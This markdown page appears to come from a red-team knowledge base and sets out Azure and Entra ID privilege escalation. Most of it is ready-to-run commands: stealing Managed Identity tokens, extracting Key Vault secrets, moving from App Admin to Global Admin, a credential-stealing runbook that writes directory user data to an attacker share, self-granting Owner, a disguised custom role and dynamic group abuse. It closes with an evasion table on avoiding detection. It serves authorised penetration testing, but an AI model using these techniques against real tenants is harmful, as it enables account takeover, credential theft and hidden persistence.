# Azure Privilege Escalation
> **MITRE ATT&CK**: Privilege Escalation > T1078.004 - Valid Accounts: Cloud Accounts
> **Platforms**: Azure / Entra ID
> **Required Privileges**: Low to Medium
> **OPSEC Risk**: Medium

## Strategic Overview

Azure privilege escalation operates across two distinct planes: the Azure AD identity
plane (Entra ID roles like Global Admin) and the Azure Resource Manager plane (RBAC
roles like Owner/Contributor). These planes interact in complex ways -- an Application
Administrator in Azure AD can escalate to Global Admin through service principal
manipulation, while a Contributor on a VM can steal Managed Identity tokens to access
resources beyond their RBAC scope. A red team lead must map both planes simultaneously
to find the shortest path to full control.

## Technical Deep-Dive

### Managed Identity Abuse

```bash
# Azure VMs with Managed Identity expose tokens via IMDS
# System-assigned managed identity
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq .

# User-assigned managed identity (specify client ID)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=CLIENT_GUID"

# Use the token with Azure CLI
az account get-access-token  # From inside the VM, automatic MI auth

# App Service managed identity (different endpoint)
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/"

# Azure Function managed identity (same App Service endpoint)
# Access ARM, Key Vault, Graph, Storage, SQL, etc.
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://vault.azure.net"
```

### Key Vault Access via Compromised Identity

```bash
# List accessible Key Vaults
az keyvault list --query "[].{Name:name,RG:resourceGroup}"

# Extract secrets
az keyvault secret list --vault-name target-vault --query "[].{Name:name,Enabled:attributes.enabled}"
az keyvault secret show --vault-name target-vault --name admin-password --query value -o tsv

# Extract certificates (including private keys)
az keyvault certificate list --vault-name target-vault
az keyvault certificate download --vault-name target-vault --name cert-name -f cert.pem

# Extract cryptographic keys
az keyvault key list --vault-name target-vault

# Key Vault access requires both:
# 1. RBAC/Access Policy permission on the Key Vault
# 2. Network access (firewall rules may restrict)
# Managed Identities on VMs in the same VNet often have both
```

### Azure AD Role Escalation Paths

```powershell
# Application Administrator -> Global Admin path
# Step 1: As App Admin, add credentials to an app with high-priv SP
$sp = Get-AzureADServicePrincipal -Filter "displayName eq 'Microsoft Graph'"
New-AzureADServicePrincipalPasswordCredential -ObjectId $sp.ObjectId

# Step 2: Authenticate as the service principal
$secPassword = ConvertTo-SecureString "NewSecret" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($sp.AppId, $secPassword)
Connect-AzureAD -ServicePrincipal -Credential $credential -TenantId $tenantId

# Privileged Role Administrator -> Global Admin
# Can directly assign the Global Admin role to any user
Add-AzureADDirectoryRoleMember -ObjectId (Get-AzureADDirectoryRole | Where-Object {
    $_.DisplayName -eq "Global Administrator"
}).ObjectId -RefObjectId $targetUserId

# User Administrator -> escalate via password reset of Global Admin
# UA can reset passwords for non-admin users, but check delegation carefully
Set-AzureADUserPassword -ObjectId $globalAdminId -Password $newPassword
# Works if the target GA was not protected by PIM or admin unit
```

### Automation Account Runbook Exploitation

```powershell
# Automation Accounts often use high-privilege Managed Identities
# List automation accounts
az automation account list --query "[].{Name:name,RG:resourceGroup}"

# List runbooks
az automation runbook list --automation-account-name target-auto \
  --resource-group target-rg --query "[].{Name:name,State:state}"

# Create a malicious runbook
az automation runbook create --automation-account-name target-auto \
  --resource-group target-rg --name maintenance-check --type PowerShell

# Publish runbook with credential-stealing code
$runbookContent = @'
Connect-AzAccount -Identity
$token = (Get-AzAccessToken -ResourceUrl "https://graph.microsoft.com").Token
$headers = @{Authorization = "Bearer $token"}
$users = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/users" -Headers $headers
$users.value | ConvertTo-Json | Out-File -FilePath "\\attacker\share\users.json"
'@

# Start the runbook
az automation runbook start --automation-account-name target-auto \
  --resource-group target-rg --name maintenance-check
```

### Logic App Connector Credential Theft

```bash
# Logic Apps store connector credentials as API connections
az resource list --resource-type Microsoft.Web/connections \
  --query "[].{Name:name,RG:resourceGroup}"

# List Logic Apps
az logic workflow list --query "[].{Name:name,State:state}"

# If you can modify a Logic App, insert a step to exfiltrate connector tokens
# Connectors for O365, SQL, SharePoint, etc. contain stored credentials

# Export Logic App definition (may contain inline credentials)
az logic workflow show --name target-logic-app --resource-group target-rg
```

### Resource Manager RBAC Escalation

```bash
# Check current role assignments
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --all \
  --query "[].{Role:roleDefinitionName,Scope:scope}"

# If you have Microsoft.Authorization/roleAssignments/write at any scope:
# Grant yourself Owner at subscription level
az role assignment create --assignee ATTACKER_OBJECT_ID \
  --role Owner --scope /subscriptions/SUB_ID

# Resource group level escalation (if you're Contributor on RG)
# Create a VM with managed identity, assign it broader roles
az vm create --name escalate-vm --resource-group target-rg \
  --image Ubuntu2204 --assign-identity --admin-username azadmin \
  --generate-ssh-keys
az role assignment create \
  --assignee $(az vm show --name escalate-vm --resource-group target-rg --query identity.principalId -o tsv) \
  --role Contributor --scope /subscriptions/SUB_ID
```

### Custom Role Definition Abuse

```bash
# If you have Microsoft.Authorization/roleDefinitions/write
# Create a custom role with escalated permissions
az role definition create --role-definition '{
  "Name": "Security Auditor Extended",
  "Description": "Extended security auditing capabilities",
  "Actions": ["*"],
  "NotActions": [],
  "AssignableScopes": ["/subscriptions/SUB_ID"]
}'

# Assign the custom role
az role assignment create --assignee ATTACKER_OBJECT_ID \
  --role "Security Auditor Extended" --scope /subscriptions/SUB_ID
```

### Dynamic Group Abuse for Privilege Escalation

```powershell
# Dynamic groups auto-assign membership based on user/device attributes
# If you can modify attributes that match a dynamic group's membership rule,
# you auto-join the group -- inheriting all its permissions

# Step 1: Enumerate dynamic groups and their rules (see azure-enumeration.md)
$headers = @{Authorization = "Bearer $accessToken"}
$dynGroups = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/groups?`$filter=groupTypes/any(g:g eq 'DynamicMembership')&`$select=displayName,id,membershipRule" -Headers $headers).value
$dynGroups | ForEach-Object { Write-Output "$($_.displayName): $($_.membershipRule)" }

# Step 2: Identify exploitable rules
# Example rules and their abuse:
# (user.department -eq "IT Admins")        -> Set your department to "IT Admins"
# (user.companyName -eq "Contoso")         -> Set companyName attribute
# (user.extensionAttribute1 -eq "VPN")     -> Set extensionAttribute1
# (user.jobTitle -contains "Admin")        -> Change job title

# Step 3: Modify your own attributes to match the rule
# Requires: User.ReadWrite (self-service) or User Admin/directory write
Update-MgUser -UserId "attacker@target.com" -Department "IT Admins"

# Or via Graph API:
$body = @{ department = "IT Admins" } | ConvertTo-Json
Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/me" `
  -Method PATCH -Headers $headers -Body $body -ContentType "application/json"

# Step 4: Wait for dynamic group membership processing (up to 24 hours, usually minutes)
# Once processed, you inherit all permissions assigned to the group:
# - Entra ID directory roles (if role-assignable group)
# - Azure RBAC roles
# - Application access
# - Conditional Access policy exemptions

# Key targets: role-assignable dynamic groups with broad attribute rules
# These provide a direct path from attribute modification to admin roles

# Detection: audit logs show attribute change + group membership change
# Evasion: change attribute to match during a bulk HR update cycle
```

### Application Proxy Abuse

```powershell
# Azure AD Application Proxy publishes on-premises web apps to the internet
# via Entra ID authentication -- creating a cloud-to-on-prem bridge

# Step 1: Enumerate Application Proxy apps
$headers = @{Authorization = "Bearer $accessToken"}
$apps = (Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications?`$select=displayName,appId,onPremisesPublishing" -Headers $headers).value
$proxyApps = $apps | Where-Object { $_.onPremisesPublishing -ne $null }
$proxyApps | ForEach-Object {
    Write-Output "$($_.displayName): $($_.onPremisesPublishing.externalUrl) -> $($_.onPremisesPublishing.internalUrl)"
}

# Step 2: Access on-prem apps through the proxy
# If your compromised Azure identity has access to a published app:
# - Navigate to the external URL (e.g., https://app-target.msappproxy.net)
# - Entra ID authenticates you, Application Proxy connector forwards to internal URL
# - You now have access to an on-premises application from the cloud

# Step 3: Exploit the on-prem application
# Published apps may include:
# - Internal admin portals (HR systems, ticketing, monitoring)
# - Internal web applications with additional vulnerabilities
# - Applications with service accounts that have on-prem AD privileges
# - SSRF-capable apps that can reach the internal network

# Step 4: Constrained Delegation abuse
# App Proxy connectors use Kerberos Constrained Delegation (KCD)
# to authenticate to backend apps on behalf of the cloud user
# If the connector service account has broad KCD rights,
# impersonation may extend beyond the intended target app

# The key insight: Application Proxy turns cloud identity compromise
# into on-premises application access without VPN or direct network connectivity
```

### Tooling for Azure Privilege Escalation

```bash
# AzureHound - BloodHound data collection for Azure
azurehound list --tenant TARGET_TENANT -u user@target.com -p password -o azurehound.json
# Import into BloodHound CE for attack path analysis

# MicroBurst - Azure security assessment
Import-Module MicroBurst.psm1
Invoke-EnumerateAzureBlobs -Base target         # Storage enumeration
Invoke-EnumerateAzureSubDomains -Base target    # Subdomain enumeration
Get-AzPasswords                                  # Extract credentials from various sources

# PowerZure - Azure exploitation
Import-Module PowerZure.psm1
Get-AzureTargets                                 # Enumerate attack surface
Show-AzureKeyVaultContent -VaultName target       # Key Vault dump
Get-AzureRunbookContent -All                      # Extract runbook code
```

## Detection & Evasion

| Escalation Method              | Detection Source                    | Evasion                              |
|--------------------------------|-------------------------------------|--------------------------------------|
| Managed Identity token theft   | VM activity logs                    | Use from within the VM itself        |
| RBAC role assignment           | Activity Log, Azure Policy          | Assign at resource level, not sub    |
| Automation Account abuse       | Runbook execution logs              | Modify existing runbooks, not new    |
| App credential addition        | Azure AD Audit Logs                 | Use certificate instead of password  |
| Custom role creation           | Activity Log                        | Name to match organizational style   |

## Cross-References

- [Azure Initial Access](azure-initial-access.md)
- [Azure AD / Entra ID Attacks](azure-ad-attacks.md)
- [Azure Persistence](azure-persistence.md)
- [Azure Enumeration](azure-enumeration.md) -- Pre-escalation enumeration of roles, groups, and apps
- [Azure Data Mining](azure-data-mining.md) -- Post-escalation data extraction from Key Vaults, Storage, etc.
- [Azure Defenses & Bypass](azure-defenses-bypass.md) -- PIM bypass, CA evasion during escalation
- [Cloud Tools Reference](../cloud-tools.md)

## References

- https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse
- https://github.com/BloodHoundAD/AzureHound
- https://github.com/NetSPI/MicroBurst
- https://github.com/hausec/PowerZure
- https://learn.microsoft.com/en-us/azure/role-based-access-control/
